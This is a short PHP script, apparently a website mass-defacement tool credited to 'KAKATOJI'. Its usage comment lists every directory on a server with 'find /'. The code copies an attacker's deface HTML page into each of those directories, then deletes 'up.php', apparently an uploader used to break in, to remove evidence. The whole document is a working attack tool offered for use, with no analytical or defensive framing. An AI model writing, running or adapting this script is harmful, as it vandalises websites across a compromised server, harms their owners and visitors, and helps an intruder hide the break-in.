<?php
/*
AUTHOR : KAKATOJI
USAGE : find / -type d > kaka.txt && php thisfile.php urFileDeface.html
*/
echo "\nScanning all dir.....\n";
$anu = explode("\n", file_get_contents('kaka.txt'));
foreach($anu as $lol){
copy($argv[1],$lol."/".$argv[1]);
echo "Success > ".$lol."/".$argv[1]."\n";
}
unlink("up.php");
